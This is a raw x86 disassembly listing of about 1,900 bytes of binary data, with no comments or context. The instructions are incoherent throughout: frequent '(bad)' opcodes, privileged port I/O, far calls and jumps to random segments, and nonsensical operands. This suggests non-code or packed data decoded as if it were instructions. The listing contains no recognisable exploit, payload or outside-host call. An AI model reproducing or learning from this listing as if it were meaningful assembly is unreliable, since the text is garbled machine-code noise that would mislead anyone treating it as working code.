  422122:	call   0xc0b20fdc
  422127:	xchg   ebx,eax
  422128:	xchg   ebp,eax
  422129:	lock shr DWORD PTR [eax],1
  42212c:	jo     0x42212f
  42212e:	or     DWORD PTR [edi],eax
  422130:	adc    al,0x18
  422132:	jg     0x422123
  422134:	cmp    al,0xa4
  422136:	aam    0x1e
  422138:	mov    dl,0x8f
  42213a:	and    edi,DWORD PTR [ebx-0x22041d45]
  422140:	out    0x6,eax
  422142:	and    al,0x22
  422144:	loopne 0x42213c
  422146:	mov    eax,ds:0x1bc04c40
  42214b:	mov    ds:0x4c2954f4,al
  422150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422151:	dec    edx
  422152:	in     al,dx
  422153:	pop    edx
  422154:	or     eax,0xfbed68a
  422159:	adc    DWORD PTR [edi+0x274ce01],esp
  42215f:	(bad)  
  422160:	mov    cl,BYTE PTR [edi]
  422162:	cmp    BYTE PTR [ebx+0x4e],ch
  422165:	sbb    dh,BYTE PTR [ecx]
  422167:	add    ecx,DWORD PTR ds:0xf78eea36
  42216d:	inc    ebx
  42216e:	out    0xae,al
  422170:	add    dh,cl
  422172:	push   es
  422173:	addr16 push edi
  422175:	into   
  422176:	jae    0x422176
  422178:	jg     0x4221e1
  42217a:	call   0x94a673f7
  42217f:	bound  edx,QWORD PTR [eax]
  422181:	sbb    BYTE PTR ds:0x124c2cfb,0x96
  422188:	aas    
  422189:	fisubr DWORD PTR [eax+0x713be6]
	...
  422197:	add    BYTE PTR [eax],al
  422199:	add    BYTE PTR [ebx-0x2a],dl
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp+0x64],0xd47fea3a
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	cld    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [eax],bh
  4221b3:	mov    gs,WORD PTR [edx-0x18]
  4221b6:	pop    ebx
  4221b7:	mov    ebp,0x916cdda4
  4221bc:	mov    eax,0x16041e35
  4221c1:	fidiv  DWORD PTR [eax]
  4221c3:	cmp    DWORD PTR [edx-0x80],edx
  4221c6:	jge    0x42217d
  4221c8:	adc    DWORD PTR [ecx+0x74469763],0xffffffd7
  4221cf:	test   eax,0xd109dae
  4221d4:	enter  0xc53c,0x22
  4221d8:	test   DWORD PTR [ecx+esi*8],edx
  4221db:	push   0x12722a05
  4221e0:	sub    BYTE PTR [edx+eiz*8+0x59cda75d],ah
  4221e7:	in     al,0x6d
  4221e9:	inc    esp
  4221ea:	xor    al,0xc2
  4221ec:	sub    esi,DWORD PTR [edi]
  4221ee:	fidiv  WORD PTR [eax-0x5a]
  4221f1:	pop    ecx
  4221f2:	shr    DWORD PTR [eax-0x21],1
  4221f5:	mov    ebx,DWORD PTR [edx+esi*2-0x6750503b]
  4221fc:	jb     0x42219f
  4221fe:	push   0x5d
  422200:	or     eax,0x1e8f1368
  422205:	push   0xffffffec
  422207:	push   edx
  422208:	pusha  
  422209:	loop   0x422246
  42220b:	in     al,0x5f
  42220d:	sahf   
  42220e:	in     al,dx
  42220f:	jbe    0x422197
  422211:	daa    
  422212:	add    ebx,DWORD PTR [ecx-0x5f]
  422215:	inc    esp
  422216:	call   0x4a15:0x423e7df3
  42221d:	test   eax,0x7d37a189
  422222:	cwde   
  422223:	push   esp
  422224:	fst    st(5)
  422226:	shr    DWORD PTR [ebx-0x3c70cbd7],0x72
  42222d:	outs   dx,DWORD PTR ds:[esi]
  42222e:	adc    dh,BYTE PTR [eax-0x3e]
  422231:	out    0x26,al
  422233:	xchg   ebx,eax
  422234:	lods   eax,DWORD PTR ds:[esi]
  422235:	pop    esp
  422236:	jmp    0x6292aff4
  42223b:	ret    
  42223c:	jg     0x422214
  42223e:	call   0x5617:0x785587de
  422245:	dec    edx
  422246:	fild   QWORD PTR [edi+0x72]
  422249:	(bad)  
  42224a:	jecxz  0x4221db
  42224c:	or     eax,0xd12fbfb3
  422251:	fnstsw WORD PTR [ecx]
  422253:	test   DWORD PTR [ebx],ecx
  422255:	pop    esi
  422256:	shr    DWORD PTR [ecx-0x7c],cl
  422259:	addr16 sub eax,0x728aa759
  42225f:	lods   al,BYTE PTR ds:[esi]
  422260:	inc    ebx
  422261:	mov    bh,0x7b
  422263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422264:	xlat   BYTE PTR ds:[ebx]
  422265:	dec    ecx
  422266:	ds cmp edx,0x40
  42226a:	test   eax,0x1db4441f
  42226f:	stos   DWORD PTR es:[edi],eax
  422270:	cmp    cl,dh
  422272:	mov    BYTE PTR [ecx-0x2b60c508],bh
  422278:	loope  0x422226
  42227a:	sub    esi,esi
  42227c:	aas    
  42227d:	jne    0x422289
  42227f:	inc    esi
  422280:	and    BYTE PTR [edi],dl
  422282:	mov    ch,0x8e
  422284:	jle    0x422246
  422286:	adc    eax,0xa82853b9
  42228b:	jp     0x422262
  42228d:	push   edi
  42228e:	in     eax,dx
  42228f:	imul   ebx,DWORD PTR [ebx],0x13
  422292:	mov    bl,0x90
  422294:	std    
  422295:	xor    edx,DWORD PTR [ebx+0x28]
  422298:	jp     0x4222a3
  42229a:	rcl    DWORD PTR [ecx-0x26],0xc8
  42229e:	jecxz  0x42223e
  4222a0:	adc    esi,DWORD PTR [edx]
  4222a2:	cli    
  4222a3:	xchg   edx,eax
  4222a4:	fimul  DWORD PTR [edx+0x63f99a22]
  4222aa:	pop    ebx
  4222ab:	ja     0x422240
  4222ad:	stos   DWORD PTR es:[edi],eax
  4222ae:	scas   eax,DWORD PTR es:[edi]
  4222af:	dec    esi
  4222b0:	push   ebp
  4222b1:	retf   
  4222b2:	icebp  
  4222b3:	stos   DWORD PTR es:[edi],eax
  4222b4:	xchg   ecx,eax
  4222b5:	sbb    cl,bh
  4222b7:	push   eax
  4222b8:	adc    ch,BYTE PTR [ecx-0xfa1a80a]
  4222be:	out    dx,al
  4222bf:	mov    ebp,0x9eb03418
  4222c4:	std    
  4222c5:	mov    DWORD PTR [ebp+0x6b],esi
  4222c8:	je     0x42226c
  4222ca:	push   ss
  4222cb:	inc    edi
  4222cc:	dec    edi
  4222cd:	mov    ebp,0xc08bb90f
  4222d2:	mov    ch,0x79
  4222d4:	push   0x3b
  4222d6:	adc    BYTE PTR [ebx],cl
  4222d8:	mov    bl,0x5d
  4222da:	out    0x4a,al
  4222dc:	retf   0xba6a
  4222df:	jp     0x42234e
  4222e1:	xor    BYTE PTR [ebx],al
  4222e3:	cmp    eax,0x2ad94113
  4222e8:	pop    es
  4222e9:	cdq    
  4222ea:	push   edx
  4222eb:	(bad)  
  4222ec:	mov    esp,0xdaa7baa3
  4222f1:	arpl   di,di
  4222f3:	dec    ecx
  4222f4:	xchg   ebp,eax
  4222f5:	cwde   
  4222f6:	loope  0x42235c
  4222f8:	or     ecx,DWORD PTR [edx-0x3c4a9659]
  4222fe:	pop    ebp
  4222ff:	stc    
  422300:	add    ah,cl
  422302:	and    eax,0x7c53626f
  422307:	mov    al,0xe6
  422309:	push   esp
  42230a:	pop    es
  42230b:	pop    esp
  42230c:	push   edi
  42230d:	sub    eax,0x38e8565e
  422312:	pop    edx
  422313:	cmp    ah,BYTE PTR [edx+0x4583f998]
  422319:	mov    cl,0xe4
  42231b:	ds ret 
  42231d:	add    al,0xe
  42231f:	push   0x35
  422321:	dec    esi
  422322:	(bad)
  422325:	(bad)  
  422326:	in     al,dx
  422327:	inc    ebp
  422328:	push   edx
  422329:	in     al,0x36
  42232b:	pop    edx
  42232c:	loope  0x422398
  42232e:	push   0x761a9ef0
  422333:	frstpm(287 only) 
  422335:	test   eax,0xcc22b95c
  42233a:	iret   
  42233b:	mul    DWORD PTR [ebx+ecx*4-0xb]
  42233f:	pop    edx
  422340:	jp     0x42233e
  422342:	add    eax,0x2931d377
  422347:	(bad)  
  422349:	push   ecx
  42234a:	jmp    0x2deb:0xc24f873
  422351:	scas   al,BYTE PTR es:[edi]
  422352:	rdpmc  
  422354:	js     0x4223b2
  422356:	xchg   ecx,eax
  422357:	mov    cl,0x3f
  422359:	cdq    
  42235a:	stos   DWORD PTR es:[edi],eax
  42235b:	jg     0x4222fa
  42235d:	cmp    BYTE PTR [edx+0x54c003eb],cl
  422363:	out    dx,al
  422364:	cmp    dl,BYTE PTR [ebx+0xc]
  422367:	add    BYTE PTR [eax+0xa],dl
  42236a:	mov    ebx,DWORD PTR [edi-0x32]
  42236d:	hlt    
  42236e:	add    eax,0x58c16a85
  422373:	add    BYTE PTR [ebx-0x49d196ff],0xc
  42237a:	in     eax,0x68
  42237c:	cmp    eax,0xd380704e
  422381:	iret   
  422382:	inc    ecx
  422383:	xlat   BYTE PTR ds:[ebx]
  422384:	adc    BYTE PTR ds:0x483453ef,dh
  42238a:	pusha  
  42238b:	pop    esi
  42238c:	sub    dh,BYTE PTR [eax-0x6c]
  42238f:	mov    fs,WORD PTR [edi+0x62477ada]
  422395:	lock adc eax,0x828970ed
  42239b:	dec    esi
  42239c:	mov    eax,0x7a84b72c
  4223a1:	punpckhdq mm6,QWORD PTR [ebx+0xb4d04b1]
  4223a8:	xor    edx,esi
  4223aa:	ja     0x4223c5
  4223ac:	pop    ebx
  4223ad:	test   al,0x0
	...
  4223b7:	add    BYTE PTR [eax],al
  4223b9:	add    BYTE PTR [ecx],dl
  4223bb:	push   cs
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	add    BYTE PTR [esi-0x612f6ef9],al
  4223cc:	add    DWORD PTR [eax],eax
  4223ce:	cld    
  4223cf:	add    DWORD PTR [eax],eax
  4223d1:	add    bh,ah
  4223d3:	scas   eax,DWORD PTR es:[edi]
  4223d4:	cmp    BYTE PTR [edx+0x60267ca5],ch
  4223da:	ss jl  0x4223b3
  4223dd:	(bad)  
  4223de:	imul   ecx,esi,0xfffffff9
  4223e1:	sahf   
  4223e2:	mov    al,ds:0x90600b41
  4223e7:	imul   edi,DWORD PTR [ecx],0x3d3a020b
  4223ed:	pop    esi
  4223ee:	push   ebp
  4223ef:	ins    BYTE PTR es:[edi],dx
  4223f0:	inc    ecx
  4223f1:	push   ebx
  4223f2:	aam    0xd4
  4223f4:	cmp    BYTE PTR [ecx-0x6cba4eac],bh
  4223fa:	push   edx
  4223fb:	fild   WORD PTR [ebp+0x15]
  4223fe:	mov    ds:0x8fa00133,al
  422403:	aad    0x22
  422405:	mov    ebx,0x39ef450
  42240a:	call   0xa6f387ac
  42240f:	jnp    0x422454
  422411:	shl    DWORD PTR ds:0xdc3eef38,0xfb
  422418:	scas   al,BYTE PTR es:[edi]
  422419:	jo     0x4223ea
  42241b:	(bad)  
  42241c:	adc    eax,0xd980d9bb
  422421:	sahf   
  422422:	mov    al,0x96
  422424:	push   esi
  422425:	mov    ebp,0xd2b24116
  42242a:	or     DWORD PTR [ebp+0x35e6230c],ecx
  422430:	(bad)  
  422431:	ds scas al,BYTE PTR es:[edi]
  422433:	mov    dh,0xe
  422435:	out    0xfd,al
  422437:	imul   ebp,DWORD PTR [ebp+ecx*2+0x8b64853],0xb51dc67b
  422442:	dec    ebp
  422443:	cmp    bh,bh
  422445:	push   ebp
  422446:	(bad)  
  422447:	(bad)  
  422448:	ja     0x422415
  42244a:	xor    BYTE PTR [esi],ch
  42244c:	lea    esi,[ebx+ebp*4+0x720c6e9a]
  422453:	dec    ebx
  422454:	inc    edi
  422455:	sub    dh,BYTE PTR [esi-0x3e]
  422458:	call   0xa523:0x31d9e19a
  42245f:	in     al,0x51
  422461:	sub    al,0xf7
  422463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422464:	pop    edi
  422465:	dec    ebp
  422466:	cmc    
  422467:	iret   
  422468:	(bad)
  42246c:	test   DWORD PTR [esi+ebx*1+0x3c],esp
  422470:	int3   
  422471:	(bad)  
  422472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422473:	lods   al,BYTE PTR ds:[esi]
  422474:	lock fld QWORD PTR [edi-0x69d67322]
  42247b:	imul   BYTE PTR [edi+0x516af39b]
  422481:	stc    
  422482:	mov    ?,WORD PTR [eax]
  422484:	je     0x4224bf
  422486:	lods   al,BYTE PTR ds:[esi]
  422487:	adc    al,0x47
  422489:	lock inc esi
  42248b:	push   ebx
  42248c:	test   eax,0x25ac468d
  422491:	sbb    ebp,DWORD PTR [esp+edx*4+0x5e]
  422495:	xchg   ebx,eax
  422496:	xor    cl,BYTE PTR [ebx+edi*4+0x61229a07]
  42249d:	(bad)  
  42249e:	mul    DWORD PTR [ebx+0x5f]
  4224a1:	inc    eax
  4224a2:	push   ds
  4224a3:	inc    DWORD PTR [esp+ebx*4-0x64b5d6a]
  4224aa:	nop
  4224ab:	retf   
  4224ac:	jl     0x422494
  4224ae:	imul   edi,DWORD PTR [ebp-0x74477bff],0x51
  4224b5:	pop    edx
  4224b6:	xchg   esi,eax
  4224b7:	out    dx,eax
  4224b8:	adc    al,dh
  4224ba:	enter  0xd7f7,0x36
  4224be:	sub    ch,BYTE PTR [eax-0x29]
  4224c1:	or     al,0x24
  4224c3:	loope  0x422487
  4224c5:	or     eax,0x9a1b9917
  4224ca:	pusha  
  4224cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224cc:	mov    ds:0x180f61a5,al
  4224d1:	mov    ebp,0x785558ec
  4224d6:	aam    0x59
  4224d8:	addr16 xchg edx,ebp
  4224db:	add    eax,0x85bfcd6
  4224e0:	cmp    BYTE PTR [esi],dh
  4224e2:	mov    ?,WORD PTR [ebp-0xdf93614]
  4224e8:	inc    ebp
  4224e9:	(bad)  
  4224eb:	or     al,0x95
  4224ed:	loope  0x4224a7
  4224ef:	icebp  
  4224f0:	call   0x2423:0xf0b7e266
  4224f7:	add    BYTE PTR [edx],bh
  4224f9:	jbe    0x422491
  4224fb:	popa   
  4224fc:	(bad)  
  4224fd:	(bad)  
  4224fe:	js     0x422555
  422500:	add    esi,DWORD PTR [edx-0x6b78a1a9]
  422506:	pop    ebp
  422507:	loope  0x422545
  422509:	test   eax,0xffd36f3
  42250e:	inc    esi
  42250f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422510:	cmc    
  422511:	loope  0x422592
  422513:	bound  ecx,QWORD PTR [edi+edx*4+0x22]
  422517:	lea    ebp,[ebx-0x5d604dd8]
  42251d:	inc    ecx
  42251e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42251f:	xchg   ebp,eax
  422520:	sbb    al,0x4c
  422522:	std    
  422523:	or     ah,al
  422525:	add    dh,BYTE PTR [ecx]
  422527:	into   
  422528:	adc    BYTE PTR ds:0x18f5189a,dh
  42252e:	jb     0x4224c4
  422530:	call   0x8d31:0x51ca50ac
  422537:	mov    eax,0xed06859b
  42253c:	lods   eax,DWORD PTR ds:[esi]
  42253d:	sahf   
  42253e:	outs   dx,BYTE PTR ds:[esi]
  42253f:	dec    edi
  422540:	aas    
  422541:	stc    
  422542:	sar    DWORD PTR [edi+ecx*2],1
  422545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422546:	jle    0x422548
  422548:	lahf   
  422549:	fisttp DWORD PTR [ebp+0x1def3fb8]
  42254f:	iret   
  422550:	pop    esp
  422551:	fadd   DWORD PTR cs:[ebx]
  422554:	movq   mm6,mm2
  422557:	jmp    DWORD PTR [eax-0x119cea8f]
  42255d:	xor    al,0xa3
  42255f:	lock dec esi
  422561:	cmp    esi,DWORD PTR [edx-0x16]
  422564:	or     eax,0xbcc6c950
  422569:	out    0x92,al
  42256b:	mov    BYTE PTR [ebx-0x13f87018],bl
  422571:	push   ss
  422572:	or     eax,DWORD PTR [esi+0x45]
  422575:	(bad)  
  422577:	push   0x3ce76c6d
  42257c:	inc    eax
  42257d:	xchg   esi,eax
  42257e:	xchg   ebp,edx
  422580:	(bad)  
  422581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422582:	push   0xb6d1232a
  422587:	or     ebp,edi
  422589:	sti    
  42258a:	sub    ebp,DWORD PTR [edi+0x5ebbd7b2]
  422590:	loope  0x42251f
  422592:	push   edi
  422593:	jmp    0x3516238f
  422598:	cmp    ch,BYTE PTR [eax]
  42259a:	cmp    DWORD PTR [esi+ecx*4],ebp
  42259d:	addr16 adc al,0xaf
  4225a0:	aam    0x49
  4225a2:	adc    BYTE PTR [edi],dh
  4225a4:	test   BYTE PTR [ebx+0x31],0x15
  4225a8:	sbb    DWORD PTR [ecx+0x5e],ebx
  4225ab:	aas    
  4225ac:	push   ds
  4225ad:	daa    
  4225ae:	je     0x422580
  4225b0:	mov    ds:0x410a7571,eax
  4225b5:	cmp    al,0x86
  4225b7:	jp     0x422609
  4225b9:	mov    ds:0xb5915cc,eax
  4225be:	or     eax,0xa325a08c
  4225c3:	loope  0x4225aa
  4225c5:	inc    ebp
  4225c6:	in     eax,dx
  4225c7:	pop    DWORD PTR [edi-0x7c53c91d]
  4225cd:	data16 add BYTE PTR [eax],al
	...
  4225d8:	add    BYTE PTR [eax],al
  4225da:	leave  
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    ebp,ebx
  4225e7:	and    al,0xf7
  4225e9:	data16 int3 
  4225eb:	mov    al,ds:0x1fc0001
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	(bad)  
  4225f3:	mov    ah,0x8e
  4225f5:	ins    BYTE PTR es:[edi],dx
  4225f6:	addr16 dec edx
  4225f8:	jo     0x4225a2
  4225fa:	rol    bl,0x3f
  4225fd:	pop    edi
  4225fe:	mov    ecx,0x94c64f23
  422603:	pop    eax
  422604:	jecxz  0x4225c2
  422606:	push   esi
  422607:	in     al,dx
  422608:	es push ds
  42260a:	xchg   esi,eax
  42260b:	out    dx,al
  42260c:	and    cl,BYTE PTR ds:0x79666d8e
  422612:	nop
  422613:	bound  ecx,QWORD PTR [eax]
  422615:	nop
  422616:	and    eax,0x9b8e76e6
  42261b:	imul   ebp,DWORD PTR [ecx+0x6a137869],0x3c323394
  422625:	and    al,0xbe
  422627:	call   0xebe248c0
  42262c:	stc    
  42262d:	nop
  42262e:	lock retf 0xb441
  422632:	push   esp
  422633:	pop    ecx
  422634:	out    0x86,eax
  422636:	aas    
  422637:	in     al,0x65
  422639:	sub    DWORD PTR [ebx],ecx
  42263b:	and    eax,ebp
  42263d:	cmp    DWORD PTR [edx],0x29
  422640:	pushf  
  422641:	xor    ch,BYTE PTR [ebp-0x66]
  422644:	fs scas al,BYTE PTR es:[edi]
  422646:	imul   eax,DWORD PTR [ebx-0x23e9d99f],0xf8579996
  422650:	cli    
  422651:	sbb    al,dh
  422653:	dec    edx
  422654:	pop    ds
  422655:	pop    edi
  422656:	popa   
  422657:	int    0xcb
  422659:	rcr    dl,cl
  42265b:	sub    dl,BYTE PTR [ebx-0x56246459]
  422661:	popa   
  422662:	xor    ecx,ecx
  422664:	aaa    
  422665:	mov    dh,ch
  422667:	aad    0x93
  422669:	xor    bh,ch
  42266b:	mov    cl,0xb
  42266d:	fimul  WORD PTR [ebx]
  42266f:	bound  esi,QWORD PTR [ebx]
  422671:	fild   WORD PTR [ecx+0x42]
  422674:	popf   
  422675:	jge    0x422662
  422677:	xor    eax,0xbfca08e
  42267c:	cmc    
  42267d:	mov    ch,0xe6
  42267f:	push   esi
  422680:	inc    esi
  422681:	jmp    0x4226ab
  422683:	das    
  422684:	lods   eax,DWORD PTR ds:[esi]
  422685:	ret    
  422686:	or     ch,BYTE PTR [esi-0x65]
  422689:	dec    edi
  42268a:	iret   
  42268b:	aad    0xd6
  42268d:	call   0x4e1d:0x40ee5dff
  422694:	mov    ds:0x98b24e23,eax
  422699:	gs mov ch,0xc4
  42269c:	xchg   edx,eax
  42269d:	fldcw  WORD PTR [esp+edx*2]
  4226a0:	fiadd  WORD PTR [esi+0x3d9bec88]
  4226a6:	daa    
  4226a7:	inc    edx
  4226a8:	xor    bl,BYTE PTR [edx]
  4226aa:	retf   
  4226ab:	pop    edx
  4226ac:	add    al,0xba
  4226ae:	enter  0xe209,0x68
  4226b2:	mov    esi,0x1795a34a
  4226b7:	inc    eax
  4226b8:	xchg   esp,eax
  4226b9:	enter  0x790c,0xe4
  4226bd:	adc    ebp,0xa4514f7e
  4226c3:	inc    eax
  4226c4:	mov    ds:0x179da4c7,eax
  4226c9:	sahf   
  4226ca:	pop    eax
  4226cb:	and    BYTE PTR [edx],ah
  4226cd:	in     al,dx
  4226ce:	data16 jl 0x4226e8
  4226d1:	(bad)  
  4226d2:	fcomp  QWORD PTR [ecx-0x5e]
  4226d5:	dec    esi
  4226d6:	daa    
  4226d7:	and    al,0x6e
  4226d9:	jne    0x4226ab
  4226db:	ins    DWORD PTR es:[edi],dx
  4226dc:	push   0xfffffff0
  4226de:	push   ebp
  4226df:	push   edx
  4226e0:	mov    cl,0xa6
  4226e2:	jl     0x4226e7
  4226e4:	(bad)  
  4226e5:	call   0x67db:0xb6387a31
  4226ec:	xchg   esi,eax
  4226ed:	lds    ebp,FWORD PTR [edx-0x4d]
  4226f0:	cld    
  4226f1:	pop    ebp
  4226f2:	shr    DWORD PTR [ebp+0x3efc2e5a],cl
  4226f8:	add    al,0xa2
  4226fa:	shr    BYTE PTR [ebx+ebp*8-0x22],0x74
  4226ff:	addr16 (bad) 
  422701:	cmp    al,0x38
  422703:	lds    edx,FWORD PTR [edx+0x70d1242c]
  422709:	sub    cl,BYTE PTR [ebp+0x40597aae]
  42270f:	stos   BYTE PTR es:[edi],al
  422710:	xor    esp,edi
  422712:	push   ecx
  422713:	rcr    DWORD PTR [edi],1
  422715:	iret   
  422716:	ds enter 0xa18a,0x56
  42271b:	and    al,0x31
  42271d:	out    dx,eax
  42271e:	pop    edx
  42271f:	ret    
  422720:	pop    ds
  422721:	push   ds
  422722:	mov    bh,0x10
  422724:	pushf  
  422725:	cmp    eax,0xbe7ba7da
  42272a:	fs mov ecx,0xb34ed39
  422730:	rcr    ebp,cl
  422732:	sub    eax,0x39c6994d
  422737:	test   al,0xb9
  422739:	bound  ebx,QWORD PTR [ebp+0x14fb2553]
  42273f:	cmp    eax,edx
  422741:	scas   al,BYTE PTR es:[edi]
  422742:	lock loopne 0x4227a6
  422745:	loop   0x422789
  422747:	mov    eax,ds:0x2c776380
  42274c:	pop    ecx
  42274d:	inc    ebp
  42274e:	dec    esi
  42274f:	dec    edi
  422750:	int    0x87
  422752:	adc    DWORD PTR [eax+eiz*1+0x61af8985],edx
  422759:	pusha  
  42275a:	sti    
  42275b:	dec    ecx
  42275c:	push   cs
  42275d:	retf   
  42275e:	or     al,0x30
  422760:	mov    dl,0x4b
  422762:	in     al,dx
  422763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422764:	mov    eax,ds:0x29170559
  422769:	xchg   ch,bl
  42276b:	adc    eax,0xde3ce77
  422770:	daa    
  422771:	ror    BYTE PTR [edx-0x5373be07],1
  422777:	cmp    esp,0x44
  42277a:	jle    0x4227d3
  42277c:	jmp    0x4227b4
  42277e:	sub    eax,0xa8c879dd
  422783:	ret    
  422784:	cmp    eax,0x66e19cdf
  422789:	enter  0x8c72,0x85
  42278d:	push   ss
  42278e:	push   esp
  42278f:	dec    edi
  422790:	rcr    BYTE PTR [ebx+0x4c],cl
  422793:	iret   
  422794:	addr16 pop ecx
  422796:	xor    ebp,edx
  422798:	adc    eax,0x6fd62c1c
  42279d:	mov    ds:0x16f81d30,al
  4227a2:	test   DWORD PTR fs:[esi],0xd26afb40
  4227a9:	inc    edx
  4227aa:	cmc    
  4227ab:	push   edi
  4227ac:	sub    al,0xfe
  4227ae:	sub    ch,BYTE PTR [eax+0x2a78b4db]
  4227b4:	retf   
  4227b5:	mov    dh,0x3e
  4227b7:	outs   dx,DWORD PTR ds:[esi]
  4227b8:	pop    ss
  4227b9:	xor    cl,BYTE PTR [bx-0x50]
  4227bd:	aam    0x58
  4227bf:	inc    ecx
  4227c0:	pushf  
  4227c1:	ds aas 
  4227c3:	icebp  
  4227c4:	dec    edi
  4227c5:	mov    ds:0x6a93721d,al
  4227ca:	inc    esp
  4227cb:	dec    ebx
  4227cc:	cld    
  4227cd:	xor    al,BYTE PTR [edx-0x66f7b7ed]
  4227d3:	in     eax,dx
  4227d4:	push   edx
  4227d5:	data16 adc BYTE PTR [eax+ebp*1],al
  4227d9:	scas   eax,DWORD PTR es:[edi]
  4227da:	and    esi,DWORD PTR [esi+0x6c0c8fbc]
  4227e0:	lahf   
  4227e1:	je     0x422811
  4227e3:	scas   eax,DWORD PTR es:[edi]
  4227e4:	dec    edx
  4227e5:	cdq    
  4227e6:	inc    esp
  4227e7:	mov    ds:0x3c811110,al
  4227ec:	cwde   
  4227ed:	outs   dx,DWORD PTR ds:[esi]
	...
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx-0x1de91df0],ebx
  422808:	mov    ds:0x1a2c82d,eax
  42280d:	add    ah,bh
  42280f:	add    DWORD PTR [eax],eax
  422811:	add    BYTE PTR [ebx-0x53],bl
  422814:	lds    esp,FWORD PTR [eax+eax*4]
  422817:	add    al,0x42
  422819:	adc    eax,0xd9def54b
  42281e:	loope  0x4227ce
  422820:	pop    ss
  422821:	push   cs
  422822:	cwde   
  422823:	or     eax,0xee74956d
  422828:	pop    ebp
  422829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42282a:	cdq    
  42282b:	xchg   ebx,eax
  42282c:	xchg   edi,eax
  42282d:	ret    
  42282e:	sub    al,0xf3
  422830:	or     eax,0x44a6f3f3
  422835:	add    BYTE PTR [ebx+ebx*1],ch
  422838:	ret    0xb1fe
  42283b:	popa   
  42283c:	xlat   BYTE PTR ds:[ebx]
  42283d:	or     DWORD PTR ds:0xc7562281,ebx
  422843:	xor    esi,ecx
  422845:	xchg   esi,eax
  422846:	fwait
  422847:	jl     0x42283f
  422849:	pushf  
  42284a:	sub    eax,0x464bb956
  42284f:	mov    cl,BYTE PTR [edi-0x7a]
  422852:	xchg   esp,eax
  422853:	mov    ch,0x4a
  422855:	cmp    ah,dl
  422857:	xchg   esp,eax
  422858:	test   eax,0xc2baa4
  42285d:	sub    BYTE PTR [esi-0x5f91bae3],ch
  422863:	mov    cl,0x50
  422865:	jmp    0x42282f
  422867:	fwait
  422868:	pop    ds
  422869:	jnp    0x422893
  42286b:	mov    esi,0x66333d31
  422870:	jno    0x42282a
  422872:	jns    0x422876
  422874:	call   0x9a470b4a
  422879:	sub    eax,0xe21934f8
  42287e:	retf   
  42287f:	pop    ss
  422880:	popa   
  422881:	fidivr DWORD PTR [esi]
  422883:	repz pop ss
  422885:	repnz outs dx,DWORD PTR ds:[esi]
  422887:	mov    bh,cl
  422889:	js     0x42283c
  42288b:	inc    edx
  42288c:	pop    ebx
  42288d:	inc    ecx
  42288e:	call   0xf9f95b2a
  422893:	dec    ebx
  422894:	gs cld 
  422896:	and    cl,dh
  422898:	out    0x43,al
  42289a:	fwait
  42289b:	ror    ebx,0x1c
  42289e:	call   0x57ff:0xe9230e84
  4228a5:	sub    ah,BYTE PTR [edx]
  4228a7:	xor    al,0xc0
  4228a9:	ds xchg ecx,eax
  4228ab:	mov    eax,0x6f17d200
  4228b0:	jp     0x422839
  4228b2:	fild   DWORD PTR [edi+0x14ec4a48]
  4228b8:	and    BYTE PTR [edx+0x1d],dh
  4228bb:	(bad)  
  4228bf:	stc    
  4228c0:	inc    ebp
  4228c1:	loopne 0x42293e
  4228c3:	sbb    BYTE PTR [ebp-0x3f924349],al
  4228c9:	shl    esp,1
  4228cb:	gs cwde 
  4228cd:	aas    
  4228ce:	cmp    BYTE PTR [edi],bl
  4228d0:	or     bl,ch
  4228d2:	out    0xa6,eax
  4228d4:	inc    ebx
  4228d5:	jmp    0xa091ef83
  4228da:	xor    ebx,DWORD PTR [edx]
  4228dc:	xchg   ebp,eax
  4228dd:	pop    ecx
  4228de:	cdq    
  4228df:	dec    esp
  4228e0:	push   ebp
  4228e1:	cmp    al,0x9
  4228e3:	retf   0xe438
  4228e6:	cli    
  4228e7:	adc    eax,edx
  4228e9:	jmp    0x5e85:0xe9e11bfb
  4228f0:	lods   al,BYTE PTR ds:[esi]
  4228f1:	repz push esi
  4228f3:	jns    0x42296d
  4228f5:	cli    
  4228f6:	xor    edi,DWORD PTR [edi-0x7a471f33]
  4228fc:	cmp    esi,0x5e
  4228ff:	mov    ebx,0x886ad4d6
  422904:	cmp    DWORD PTR [esi+0xd9df345],0x7d9f9e94
  42290e:	pop    ebp
  42290f:	cmp    DWORD PTR [eax-0x31],edi
  422912:	loopne 0x42298b
  422914:	imul   esi,DWORD PTR [esp+ebx*2+0x7e],0x6ee13f6b
  42291c:	jo     0x422936
  42291e:	push   ds
  42291f:	mov    ebx,0x6e6612b5
  422924:	iret   
  422925:	jle    0x4228b7
  422927:	repz out 0x88,eax
  42292a:	(bad)  
  42292b:	mov    dl,0x50
  42292d:	lahf   
  42292e:	clc    
  42292f:	and    edx,DWORD PTR [esi+0x281aeb40]
  422935:	lods   al,BYTE PTR ds:[esi]
  422936:	fs out 0x3d,al
  422939:	adc    al,0xe6
  42293b:	mov    ch,0x57
  42293d:	gs jp  0x42291d
  422940:	inc    ebp
